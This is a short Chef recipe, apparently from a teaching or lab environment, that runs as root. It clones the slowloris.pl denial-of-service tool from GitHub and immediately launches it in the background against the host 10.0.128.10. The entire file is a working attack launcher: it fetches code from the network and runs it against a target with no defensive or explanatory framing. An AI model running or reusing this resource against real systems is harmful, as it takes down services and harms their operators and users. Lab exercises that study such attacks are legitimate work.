script "install_slowloris" do

  interpreter "bash"
  user "root"
  cwd "/home/instructor"
  code <<-EOH

  git clone https://github.com/kahea/slowloris.pl
  cd slowloris.pl
  perl ./slowloris.pl -dns 10.0.128.10 &

  EOH

  not_if "test -e /home/instructor/slowloris.pl"

end